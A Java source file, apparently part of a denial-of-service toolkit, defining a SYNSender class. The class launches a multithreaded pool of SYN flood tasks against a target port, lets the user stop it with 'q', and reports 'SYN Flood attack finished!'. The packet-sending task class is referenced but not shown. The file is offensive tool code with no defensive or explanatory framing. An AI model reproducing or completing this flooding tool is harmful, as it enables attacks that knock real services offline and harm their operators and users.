package network.syn;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;

public class SYNSender {
    private final int startingPort;
    private final int targetPort;
    private final int amountOfAddresses;
    private final int threadCount;
    private final int timeout;

    private static ExecutorService executor;
    private static CountDownLatch latch;
    private static final Logger logger = Logger.getLogger(SYNSender.class.getName());

    public SYNSender(int startingPort, int targetPort, int amountOfAddresses, int threadCount, int timeout) {
        this.startingPort = startingPort;
        this.targetPort = targetPort;
        this.amountOfAddresses = amountOfAddresses;
        this.threadCount = threadCount;
        this.timeout = timeout;

        startControlThread();
    }

    private void startControlThread() {
        Thread inputThread = new Thread(() -> {
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            try {
                initializeThreadPool();

                new Thread(() -> {
                    try {
                        latch.await();
                        printFinish();
                    } catch (InterruptedException e) {
                        logger.log(Level.SEVERE, "Error within the SYNSender latch waiting thread ", e);
                    }
                }).start();

                while (true) {
                    String input = reader.readLine();
                    if (input != null && input.equals("q")) {
                        stop();
                        break;
                    }
                }
            } catch (IOException e) {
                logger.log(Level.SEVERE, "Error within the SYNSender main thread ", e);
            }
        });

        inputThread.start();
    }

    private void initializeThreadPool() {
        executor = Executors.newFixedThreadPool(threadCount);
        latch = new CountDownLatch(threadCount);

        // Same situation here as in UDPSender
        for (int i = 0; i < threadCount; i++)
            executor.execute(new SYNSenderTask(i + 1, startingPort + 1, targetPort, amountOfAddresses, timeout, latch));

        executor.shutdown();
    }

    private void printFinish() {
        System.out.println("SYN Flood attack finished!");
    }

    public void stop() {
        if (executor != null)
            executor.shutdownNow();
        System.out.println("Stopped! Exiting...");
    }
}
